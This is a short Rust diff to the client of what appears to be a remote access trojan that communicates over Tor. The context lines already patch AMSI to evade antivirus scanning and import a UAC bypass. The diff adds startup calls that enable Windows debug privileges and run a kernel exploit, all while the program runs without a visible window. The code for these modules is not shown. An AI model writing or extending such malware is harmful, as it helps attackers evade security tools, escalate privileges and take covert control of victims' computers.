@@ -1,6 +1,6 @@
 #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 #[cfg(target_os = "windows")]
-use artirat_client::{amsi_patch,uac_bypass};
+use artirat_client::{amsi_patch,uac_bypass,debug_privileges,kernel_exploit};
 use std::env;
 use arti_client::{TorClient, TorClientConfig, DataStream};
 use tor_rtcompat::PreferredRuntime;
@@ -231,6 +231,11 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
 pub async fn netclient() -> Result<()> {
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
+    #[cfg(target_os = "windows")]
+    debug_privileges::enable_debug_privileges();
+    #[cfg(target_os = "windows")]
+    kernel_exploit::kernel_exploit();
+    
     let exe_path = env::current_exe()?;
     let exe_path_str = exe_path.to_string_lossy().to_string();
     if is_admin(){
